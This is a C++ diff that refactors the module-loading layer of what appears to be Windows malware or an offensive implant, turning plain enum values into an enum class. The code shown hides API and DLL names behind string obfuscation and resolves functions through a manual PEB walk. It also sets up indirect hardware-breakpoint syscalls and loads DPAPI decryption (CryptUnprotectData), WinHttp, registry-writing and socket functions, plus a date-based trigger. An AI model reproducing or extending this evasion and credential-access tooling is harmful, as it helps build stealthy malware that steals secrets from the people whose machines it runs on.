@@ -76,7 +76,7 @@ HMODULE GetModuleBaseAddress(LPCWSTR ModuleName) {
 
     // Check module cache first (avoids PEB walk for already-cached modules)
     if (ModuleCache::g_moduleCache.initialized) {
-        for (uint8_t i = 1; i < ModuleCache::MOD_MAX; i++) {
+        for (uint8_t i = 1; i < static_cast<uint8_t>(ModuleCache::Module::MAX); i++) {
             if (ModuleCache::g_moduleCache.entries[i].loaded && ModuleCache::g_moduleCache.entries[i].handle &&
                 ModuleCache::g_moduleCache.entries[i].name &&
                 __wcscmp(ModuleCache::g_moduleCache.entries[i].name, ModuleName) == 0) {
@@ -104,7 +104,7 @@ HMODULE GetModuleBaseAddress(LPCWSTR ModuleName) {
             HMODULE base = (HMODULE)dataEntry->DllBase;
             // Populate cache on PEB walk hit for future lookups
             if (ModuleCache::g_moduleCache.initialized) {
-                for (uint8_t i = 1; i < ModuleCache::MOD_MAX; i++) {
+        for (uint8_t i = 1; i < static_cast<uint8_t>(ModuleCache::Module::MAX); i++) {
                     if (!ModuleCache::g_moduleCache.entries[i].loaded &&
                         ModuleCache::g_moduleCache.entries[i].name &&
                         __wcsicmp(ModuleCache::g_moduleCache.entries[i].name, ModuleName) == 0) {
@@ -311,7 +311,7 @@ FARPROC GetExportedFunctionAddress(void *moduleBase, const char *functionName, L
     } while(0)
 
 static bool LoadWinHttp(functionTable* funcTable) {
-    HMODULE WinHttpBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::MOD_WINHTTP);
+    HMODULE WinHttpBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::WINHTTP);
 
     RESOLVE(funcTable, WinHttpBase, WinHttpOpen);
     RESOLVE(funcTable, WinHttpBase, WinHttpConnect);
@@ -329,7 +329,7 @@ static bool LoadWinHttp(functionTable* funcTable) {
 }
 
 static bool LoadAdvapi(functionTable* funcTable) {
-    HMODULE Advapi32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::MOD_ADVAPI32);
+    HMODULE Advapi32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::ADVAPI32);
     RESOLVE(funcTable, Advapi32Base, RegOpenKeyExA);
     RESOLVE(funcTable, Advapi32Base, RegQueryValueExW);
     RESOLVE(funcTable, Advapi32Base, RegSetValueExA);
@@ -348,19 +348,19 @@ static bool LoadAdvapi(functionTable* funcTable) {
 }
 
 static bool LoadGdi(functionTable* funcTable) {
-    HMODULE gdiBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::MOD_GDI32);
+    HMODULE gdiBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::GDI32);
     (void)gdiBase;
     return true;
 }
 
 static bool LoadShell32(functionTable* funcTable) {
-    HMODULE Shell32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::MOD_SHELL32);
+    HMODULE Shell32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::SHELL32);
     funcTable->SHGetFolderPathW = (pSHGetFolderPathW) __GetProcAddress(Shell32Base, lcg_encrypt("SHGetFolderPathW"));
     return true;
 }
 
 static bool LoadCrypt32(functionTable* funcTable) {
-    HMODULE Crypt32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::MOD_CRYPT32);
+    HMODULE Crypt32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::CRYPT32);
     RESOLVE(funcTable, Crypt32Base, CryptUnprotectData);
     RESOLVE(funcTable, Crypt32Base, CryptStringToBinaryA);
     RESOLVE(funcTable, Crypt32Base, CryptStringToBinaryW);
@@ -376,7 +376,7 @@ static bool LoadCrypt32(functionTable* funcTable) {
 }
 
 static bool LoadWs2_32(functionTable* funcTable) {
-    HMODULE ws2_32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::MOD_WS2_32);
+    HMODULE ws2_32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::WS2_32);
     RESOLVE(funcTable, ws2_32Base, WSAStartup);
     RESOLVE(funcTable, ws2_32Base, WSACleanup);
     RESOLVE(funcTable, ws2_32Base, WSAGetLastError);
@@ -401,7 +401,7 @@ static bool LoadWs2_32(functionTable* funcTable) {
 }
 
 static bool LoadMpr(functionTable* funcTable) {
-    HMODULE MprBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::MOD_MPR);
+    HMODULE MprBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::MPR);
     funcTable->WNetGetProviderNameW = (pWNetGetProviderNameW) __GetProcAddress(MprBase, lcg_encrypt("WNetGetProviderNameW"));
     return true;
 }
@@ -411,7 +411,7 @@ static bool LoadMpr(functionTable* funcTable) {
 #endif
 static bool LoadCRT(functionTable* funcTable) {
     #ifdef DEBUG
-        HMODULE msvcrtBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::MOD_MSVCRT);
+        HMODULE msvcrtBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::MSVCRT);
         funcTable->printf = (pPrintf) __GetProcAddress(msvcrtBase, lcg_encrypt("printf"));
         funcTable->puts   = (pPuts)   __GetProcAddress(msvcrtBase, lcg_encrypt("puts"));
     #endif
@@ -419,7 +419,7 @@ static bool LoadCRT(functionTable* funcTable) {
 }
 
 static bool LoadSChannel(functionTable* funcTable) {
-    HMODULE secur32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::MOD_SECUR32);
+    HMODULE secur32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::SECUR32);
     RESOLVE(funcTable, secur32Base, AcquireCredentialsHandleA);
     RESOLVE(funcTable, secur32Base, InitializeSecurityContextA);
     RESOLVE(funcTable, secur32Base, CompleteAuthToken);
@@ -435,13 +435,13 @@ static bool LoadSChannel(functionTable* funcTable) {
 }
 
 static bool LoadBcrypt(functionTable* funcTable) {
-    HMODULE hBcrypt = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::MOD_BCRYPT);
+    HMODULE hBcrypt = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::BCRYPT);
     funcTable->BCryptGenRandom = (pBCryptGenRandom)__GetProcAddress(hBcrypt, lcg_encrypt("BCryptGenRandom"));
     return true;
 }
 
 static bool LoadUser32(functionTable* funcTable) {
-    HMODULE user32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::MOD_USER32);
+    HMODULE user32Base = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::USER32);
     RESOLVE(funcTable, user32Base, GetDC);
     RESOLVE(funcTable, user32Base, ReleaseDC);
     RESOLVE(funcTable, user32Base, GetSystemMetrics);
@@ -472,13 +472,13 @@ static bool LoadUser32(functionTable* funcTable) {
 }
 
 static bool LoadIphlpapi(functionTable* funcTable) {
-    HMODULE iphlpapiBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::MOD_IPHLPAPI);
+    HMODULE iphlpapiBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::IPHLPAPI);
     funcTable->GetAdaptersAddresses = (pGetAdaptersAddresses) __GetProcAddress(iphlpapiBase, lcg_encrypt("GetAdaptersAddresses"));
     return true;
 }
 
 static bool LoadOleAuth32(functionTable* funcTable) {
-    HMODULE oleAuthBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::MOD_OLEAUT32);
+    HMODULE oleAuthBase = ModuleCache::GetCachedModuleHandle(funcTable, ModuleCache::Module::OLEAUT32);
     funcTable->VariantClear   = (pVariantClear) __GetProcAddress(oleAuthBase, lcg_encrypt("VariantClear"));
     funcTable->VariantInit    = (pVariantInit)  __GetProcAddress(oleAuthBase, lcg_encrypt("VariantInit"));
     return true;
@@ -490,47 +490,41 @@ static bool LoadOleAuth32(functionTable* funcTable) {
  * dead code and are stripped by LTO.
  * ============================================================================ */
 
-template<> bool ModuleCache::LoadModule<ModuleCache::MOD_ADVAPI32>(functionTable* funcTable) {
-    HMODULE hMod = ModuleCache::GetCachedModuleHandleStatic(ModuleCache::MOD_ADVAPI32);
+template<> bool ModuleCache::LoadModule<ModuleCache::Module::ADVAPI32>(functionTable* funcTable) {
+    HMODULE hMod = ModuleCache::GetCachedModuleHandleStatic(ModuleCache::Module::ADVAPI32);
     if (!hMod) return false;
     LoadAdvapi(funcTable);
-    funcTable->loadedModules |= (1u << ModuleCache::MOD_ADVAPI32);
+    funcTable->loadedModules |= (1u << static_cast<int>(ModuleCache::Module::ADVAPI32));
     return true;
 }
-template<> bool ModuleCache::LoadModule<ModuleCache::MOD_IPHLPAPI>(functionTable* funcTable) {
-    HMODULE hMod = ModuleCache::GetCachedModuleHandleStatic(ModuleCache::MOD_IPHLPAPI);
+template<> bool ModuleCache::LoadModule<ModuleCache::Module::IPHLPAPI>(functionTable* funcTable) {
+    HMODULE hMod = ModuleCache::GetCachedModuleHandleStatic(ModuleCache::Module::IPHLPAPI);
     if (!hMod) return false;
     LoadIphlpapi(funcTable);
-    funcTable->loadedModules |= (1u << ModuleCache::MOD_IPHLPAPI);
+    funcTable->loadedModules |= (1u << static_cast<int>(ModuleCache::Module::IPHLPAPI));
     return true;
 }
-template<> bool ModuleCache::LoadModule<ModuleCache::MOD_WINHTTP>(functionTable* funcTable) {
-    HMODULE hMod = ModuleCache::GetCachedModuleHandleStatic(ModuleCache::MOD_WINHTTP);
+template<> bool ModuleCache::LoadModule<ModuleCache::Module::WINHTTP>(functionTable* funcTable) {
+    HMODULE hMod = ModuleCache::GetCachedModuleHandleStatic(ModuleCache::Module::WINHTTP);
     if (!hMod) return false;
     LoadWinHttp(funcTable);
-    funcTable->loadedModules |= (1u << ModuleCache::MOD_WINHTTP);
+    funcTable->loadedModules |= (1u << static_cast<int>(ModuleCache::Module::WINHTTP));
     return true;
 }
-template<> bool ModuleCache::LoadModule<ModuleCache::MOD_BCRYPT>(functionTable* funcTable) {
-    HMODULE hMod = ModuleCache::GetCachedModuleHandleStatic(ModuleCache::MOD_BCRYPT);
+template<> bool ModuleCache::LoadModule<ModuleCache::Module::BCRYPT>(functionTable* funcTable) {
+    HMODULE hMod = ModuleCache::GetCachedModuleHandleStatic(ModuleCache::Module::BCRYPT);
     if (!hMod) return false;
     LoadBcrypt(funcTable);
-    funcTable->loadedModules |= (1u << ModuleCache::MOD_BCRYPT);
+    funcTable->loadedModules |= (1u << static_cast<int>(ModuleCache::Module::BCRYPT));
     return true;
 }
 
 /* Explicit instantiations, makes these visible to other TUs  */
-template<> bool ModuleCache::LoadModule<ModuleCache::MOD_WS2_32>(functionTable* funcTable) {
+template<> bool ModuleCache::LoadModule<ModuleCache::Module::WS2_32>(functionTable* funcTable) {
     LoadWs2_32(funcTable);
-    funcTable->loadedModules |= (1u << ModuleCache::MOD_WS2_32);
+    funcTable->loadedModules |= (1u << static_cast<int>(ModuleCache::Module::WS2_32));
     return true;
 }
-
-template bool ModuleCache::LoadModule<ModuleCache::MOD_ADVAPI32>(functionTable*);
-template bool ModuleCache::LoadModule<ModuleCache::MOD_IPHLPAPI>(functionTable*);
-template bool ModuleCache::LoadModule<ModuleCache::MOD_WINHTTP>(functionTable*);
-template bool ModuleCache::LoadModule<ModuleCache::MOD_WS2_32>(functionTable*);
-template bool ModuleCache::LoadModule<ModuleCache::MOD_BCRYPT>(functionTable*);
 
 static VOID initntdll(functionTable* t, HMODULE ntdllBase) {
     RESOLVE(t, ntdllBase, NtClose);
@@ -580,6 +574,8 @@ static VOID initntdll(functionTable* t, HMODULE ntdllBase) {
     RESOLVE(t, ntdllBase, RtlFreeHeap);
     RESOLVE(t, ntdllBase, RtlAllocateHeap);
     RESOLVE(t, ntdllBase, RtlRandomEx);
+    RESOLVE(t, ntdllBase, RtlWaitOnAddress);
+    RESOLVE(t, ntdllBase, RtlWakeByAddressSingle);
     RESOLVE(t, ntdllBase, LdrLoadDll);
     RESOLVE(t, ntdllBase, NtSetEvent);
     RESOLVE(t, ntdllBase, NtOpenKey);
@@ -820,10 +816,10 @@ functionTable* InitializeFunctionTable(bool initWin32API, bool initWin32u, bool 
     funcTable->loadedModules = 0;
     ModuleCache::InitModuleCache();
     /* Pre-populate cache with already-loaded ntdll/kernel32 handles */
-    ModuleCache::g_moduleCache.entries[ModuleCache::MOD_NTDLL].handle = (HMODULE)ntdllBase;
-    ModuleCache::g_moduleCache.entries[ModuleCache::MOD_NTDLL].loaded = true;
-    ModuleCache::g_moduleCache.entries[ModuleCache::MOD_KERNEL32].handle = (HMODULE)kernel32Base;
-    ModuleCache::g_moduleCache.entries[ModuleCache::MOD_KERNEL32].loaded = true;
+    ModuleCache::g_moduleCache.entries[static_cast<size_t>(ModuleCache::Module::NTDLL)].handle = (HMODULE)ntdllBase;
+    ModuleCache::g_moduleCache.entries[static_cast<size_t>(ModuleCache::Module::NTDLL)].loaded = true;
+    ModuleCache::g_moduleCache.entries[static_cast<size_t>(ModuleCache::Module::KERNEL32)].handle = (HMODULE)kernel32Base;
+    ModuleCache::g_moduleCache.entries[static_cast<size_t>(ModuleCache::Module::KERNEL32)].loaded = true;
 
     c_debugPrint(funcTable, "Module loading complete (ntdll + kernel32 only; other modules load lazily)");
 
@@ -831,7 +827,7 @@ functionTable* InitializeFunctionTable(bool initWin32API, bool initWin32u, bool 
 
     if(_initSyscalls) {
         c_debugPrint(funcTable, "Initializing syscalls...");
-        if(!initSyscalls(SYSCALL_HWSYSCALLS)) {
+        if(!initSyscalls(SYSCALLS_ID::HWSYSCALLS)) {
             c_debugPrint(funcTable, "Unable to retrieve syscalls.");
         }
         else {
@@ -1615,8 +1611,8 @@ bool generateSecureRandom(functionTable* f, uint8_t* buffer, size_t length) {
     if (!f || !buffer || length == 0) return false;
 
     // Ensure crypto modules are loaded (CSPRNG depends on bcrypt/advapi32)
-    REQUIRES_MODULE(f, ModuleCache::MOD_BCRYPT);
-    REQUIRES_MODULE(f, ModuleCache::MOD_ADVAPI32);
+    REQUIRES_MODULE(f, ModuleCache::Module::BCRYPT);
+    REQUIRES_MODULE(f, ModuleCache::Module::ADVAPI32);
 
     // Try BCryptGenRandom first (Windows Vista+)
     if (f->BCryptGenRandom) {
@@ -1722,27 +1718,27 @@ namespace ModuleCache {
     /* Module cache storage instance */
     ModuleCacheStorage g_moduleCache = {};
 
-    /* Get module name string from MODULE_ID */
-    static const wchar_t* GetModuleNameInternal(MODULE_ID moduleId)
+    /* Get module name string from Module */
+    static const wchar_t* GetModuleNameInternal(Module moduleId)
     {
         switch (moduleId)
         {
-            case MOD_KERNEL32:  return lcg_encryptw(L"kernel32.dll");
-            case MOD_NTDLL:     return lcg_encryptw(L"ntdll.dll");
-            case MOD_ADVAPI32:  return lcg_encryptw(L"advapi32.dll");
-            case MOD_USER32:    return lcg_encryptw(L"user32.dll");
-            case MOD_GDI32:     return lcg_encryptw(L"gdi32.dll");
-            case MOD_SHELL32:   return lcg_encryptw(L"shell32.dll");
-            case MOD_OLE32:     return lcg_encryptw(L"ole32.dll");
-            case MOD_OLEAUT32:  return lcg_encryptw(L"oleaut32.dll");
-            case MOD_WS2_32:    return lcg_encryptw(L"ws2_32.dll");
-            case MOD_CRYPT32:   return lcg_encryptw(L"crypt32.dll");
-            case MOD_WINHTTP:   return lcg_encryptw(L"winhttp.dll");
-            case MOD_SECUR32:   return lcg_encryptw(L"secur32.dll");
-            case MOD_BCRYPT:    return lcg_encryptw(L"bcrypt.dll");
-            case MOD_IPHLPAPI:  return lcg_encryptw(L"iphlpapi.dll");
-            case MOD_MPR:       return lcg_encryptw(L"mpr.dll");
-            case MOD_MSVCRT:    return lcg_encryptw(L"msvcrt.dll");
+            case Module::KERNEL32:  return lcg_encryptw(L"kernel32.dll");
+            case Module::NTDLL:     return lcg_encryptw(L"ntdll.dll");
+            case Module::ADVAPI32:  return lcg_encryptw(L"advapi32.dll");
+            case Module::USER32:    return lcg_encryptw(L"user32.dll");
+            case Module::GDI32:     return lcg_encryptw(L"gdi32.dll");
+            case Module::SHELL32:   return lcg_encryptw(L"shell32.dll");
+            case Module::OLE32:     return lcg_encryptw(L"ole32.dll");
+            case Module::OLEAUT32:  return lcg_encryptw(L"oleaut32.dll");
+            case Module::WS2_32:    return lcg_encryptw(L"ws2_32.dll");
+            case Module::CRYPT32:   return lcg_encryptw(L"crypt32.dll");
+            case Module::WINHTTP:   return lcg_encryptw(L"winhttp.dll");
+            case Module::SECUR32:   return lcg_encryptw(L"secur32.dll");
+            case Module::BCRYPT:    return lcg_encryptw(L"bcrypt.dll");
+            case Module::IPHLPAPI:  return lcg_encryptw(L"iphlpapi.dll");
+            case Module::MPR:       return lcg_encryptw(L"mpr.dll");
+            case Module::MSVCRT:    return lcg_encryptw(L"msvcrt.dll");
             default:            return NULL;
         }
     }
@@ -1752,18 +1748,18 @@ namespace ModuleCache {
     * Uses __LoadLibraryW for loading
     * Transparent caching - returns cached handle if already loaded
     */
-    HMODULE GetCachedModuleHandle(functionTable* funcTable, MODULE_ID moduleId)
+    HMODULE GetCachedModuleHandle(functionTable* funcTable, Module moduleId)
     {
         /* Validate module ID */
-        if (moduleId <= MOD_NONE || moduleId >= MOD_MAX)
+        if (moduleId <= Module::NONE || moduleId >= Module::MAX)
         {
             return NULL;
         }
 
         /* Return cached handle if already loaded */
-        if (g_moduleCache.entries[moduleId].loaded && g_moduleCache.entries[moduleId].handle != NULL)
+        if (g_moduleCache.entries[static_cast<size_t>(moduleId)].loaded && g_moduleCache.entries[static_cast<size_t>(moduleId)].handle != NULL)
         {
-            return g_moduleCache.entries[moduleId].handle;
+            return g_moduleCache.entries[static_cast<size_t>(moduleId)].handle;
         }
 
         /* Get module name for loading */
@@ -1777,53 +1773,53 @@ namespace ModuleCache {
         HMODULE hModule = NULL;
         switch (moduleId)
         {
-            case MOD_KERNEL32:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_KERNEL32));
+            case Module::KERNEL32:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::KERNEL32));
                 break;
-            case MOD_NTDLL:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_NTDLL));
+            case Module::NTDLL:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::NTDLL));
                 break;
-            case MOD_ADVAPI32:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_ADVAPI32));
+            case Module::ADVAPI32:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::ADVAPI32));
                 break;
-            case MOD_USER32:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_USER32));
+            case Module::USER32:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::USER32));
                 break;
-            case MOD_GDI32:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_GDI32));
+            case Module::GDI32:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::GDI32));
                 break;
-            case MOD_SHELL32:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_SHELL32));
+            case Module::SHELL32:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::SHELL32));
                 break;
-            case MOD_OLE32:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_OLE32));
+            case Module::OLE32:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::OLE32));
                 break;
-            case MOD_OLEAUT32:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_OLEAUT32));
+            case Module::OLEAUT32:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::OLEAUT32));
                 break;
-            case MOD_WS2_32:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_WS2_32));
+            case Module::WS2_32:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::WS2_32));
                 break;
-            case MOD_CRYPT32:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_CRYPT32));
+            case Module::CRYPT32:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::CRYPT32));
                 break;
-            case MOD_WINHTTP:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_WINHTTP));
+            case Module::WINHTTP:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::WINHTTP));
                 break;
-            case MOD_SECUR32:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_SECUR32));
+            case Module::SECUR32:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::SECUR32));
                 break;
-            case MOD_BCRYPT:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_BCRYPT));
+            case Module::BCRYPT:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::BCRYPT));
                 break;
-            case MOD_IPHLPAPI:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_IPHLPAPI));
+            case Module::IPHLPAPI:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::IPHLPAPI));
                 break;
-            case MOD_MPR:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_MPR));
+            case Module::MPR:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::MPR));
                 break;
-            case MOD_MSVCRT:
-                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(MOD_MSVCRT));
+            case Module::MSVCRT:
+                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::MSVCRT));
                 break;
             default:
                 return NULL;
@@ -1832,10 +1828,10 @@ namespace ModuleCache {
         /* Cache the result if successful */
         if (hModule != NULL)
         {
-            g_moduleCache.entries[moduleId].id      = moduleId;
-            g_moduleCache.entries[moduleId].handle  = hModule;
-            g_moduleCache.entries[moduleId].name    = dllName;
-            g_moduleCache.entries[moduleId].loaded  = true;
+            g_moduleCache.entries[static_cast<size_t>(moduleId)].id      = moduleId;
+            g_moduleCache.entries[static_cast<size_t>(moduleId)].handle  = hModule;
+            g_moduleCache.entries[static_cast<size_t>(moduleId)].name    = dllName;
+            g_moduleCache.entries[static_cast<size_t>(moduleId)].loaded  = true;
         }
 
         return hModule;
@@ -1845,18 +1841,18 @@ namespace ModuleCache {
     * Static version without functionTable dependency
     * Uses internal LdrLoadDll resolution
     */
-    HMODULE GetCachedModuleHandleStatic(MODULE_ID moduleId)
+    HMODULE GetCachedModuleHandleStatic(Module moduleId)
     {
         /* Validate module ID */
-        if (moduleId <= MOD_NONE || moduleId >= MOD_MAX)
+        if (moduleId <= Module::NONE || moduleId >= Module::MAX)
         {
             return NULL;
         }
 
         /* Return cached handle if already loaded */
-        if (g_moduleCache.entries[moduleId].loaded && g_moduleCache.entries[moduleId].handle != NULL)
+        if (g_moduleCache.entries[static_cast<size_t>(moduleId)].loaded && g_moduleCache.entries[static_cast<size_t>(moduleId)].handle != NULL)
         {
-            return g_moduleCache.entries[moduleId].handle;
+            return g_moduleCache.entries[static_cast<size_t>(moduleId)].handle;
         }
 
         /* Get module name for loading */
@@ -1870,53 +1866,53 @@ namespace ModuleCache {
         HMODULE hModule = NULL;
         switch (moduleId)
         {
-            case MOD_KERNEL32:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_KERNEL32));
+            case Module::KERNEL32:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::KERNEL32));
                 break;
-            case MOD_NTDLL:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_NTDLL));
+            case Module::NTDLL:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::NTDLL));
                 break;
-            case MOD_ADVAPI32:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_ADVAPI32));
+            case Module::ADVAPI32:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::ADVAPI32));
                 break;
-            case MOD_USER32:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_USER32));
+            case Module::USER32:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::USER32));
                 break;
-            case MOD_GDI32:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_GDI32));
+            case Module::GDI32:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::GDI32));
                 break;
-            case MOD_SHELL32:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_SHELL32));
+            case Module::SHELL32:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::SHELL32));
                 break;
-            case MOD_OLE32:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_OLE32));
+            case Module::OLE32:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::OLE32));
                 break;
-            case MOD_OLEAUT32:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_OLEAUT32));
+            case Module::OLEAUT32:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::OLEAUT32));
                 break;
-            case MOD_WS2_32:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_WS2_32));
+            case Module::WS2_32:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::WS2_32));
                 break;
-            case MOD_CRYPT32:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_CRYPT32));
+            case Module::CRYPT32:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::CRYPT32));
                 break;
-            case MOD_WINHTTP:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_WINHTTP));
+            case Module::WINHTTP:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::WINHTTP));
                 break;
-            case MOD_SECUR32:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_SECUR32));
+            case Module::SECUR32:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::SECUR32));
                 break;
-            case MOD_BCRYPT:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_BCRYPT));
+            case Module::BCRYPT:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::BCRYPT));
                 break;
-            case MOD_IPHLPAPI:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_IPHLPAPI));
+            case Module::IPHLPAPI:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::IPHLPAPI));
                 break;
-            case MOD_MPR:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_MPR));
+            case Module::MPR:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::MPR));
                 break;
-            case MOD_MSVCRT:
-                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(MOD_MSVCRT));
+            case Module::MSVCRT:
+                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::MSVCRT));
                 break;
             default:
                 return NULL;
@@ -1925,23 +1921,22 @@ namespace ModuleCache {
         /* Cache the result if successful */
         if (hModule != NULL)
         {
-            g_moduleCache.entries[moduleId].id      = moduleId;
-            g_moduleCache.entries[moduleId].handle  = hModule;
-            g_moduleCache.entries[moduleId].name    = dllName;
-            g_moduleCache.entries[moduleId].loaded  = true;
+            g_moduleCache.entries[static_cast<size_t>(moduleId)].id      = moduleId;
+            g_moduleCache.entries[static_cast<size_t>(moduleId)].handle  = hModule;
+            g_moduleCache.entries[static_cast<size_t>(moduleId)].name    = dllName;
+            g_moduleCache.entries[static_cast<size_t>(moduleId)].loaded  = true;
         }
 
         return hModule;
     }
 
-    /* Initialize the module cache */
     void InitModuleCache(void)
     {
-        for (int i = 0; i < MOD_MAX; i++)
+        for (int i = 0; i < static_cast<int>(Module::MAX); i++)
         {
-            g_moduleCache.entries[i].id       = (MODULE_ID)i;
+            g_moduleCache.entries[i].id       = static_cast<Module>(i);
             g_moduleCache.entries[i].handle   = NULL;
-            g_moduleCache.entries[i].name     = GetModuleNameInternal((MODULE_ID)i);
+            g_moduleCache.entries[i].name     = GetModuleNameInternal(static_cast<Module>(i));
             g_moduleCache.entries[i].loaded   = false;
         }
         g_moduleCache.initialized = true;
@@ -1950,7 +1945,7 @@ namespace ModuleCache {
     /* Clear all cached module handles (does not free libraries) */
     void ClearModuleCache(void)
     {
-        for (int i = 0; i < MOD_MAX; i++)
+        for (int i = 0; i < static_cast<int>(Module::MAX); i++)
         {
             g_moduleCache.entries[i].handle = NULL;
             g_moduleCache.entries[i].loaded = false;
@@ -2070,7 +2065,7 @@ bool isDateReached(functionTable* f, uint32_t DateUnix) {
 
 void initSyscallsLayer(functionTable* funcTable) {
     if (!funcTable) return;
-    initSyscalls(SYSCALL_HWSYSCALLS);
+    (void)initSyscalls(SYSCALLS_ID::HWSYSCALLS);
     setNTAPISyscalls(funcTable);
     funcTable->parameters.areSyscallsInitialized = true;
 }
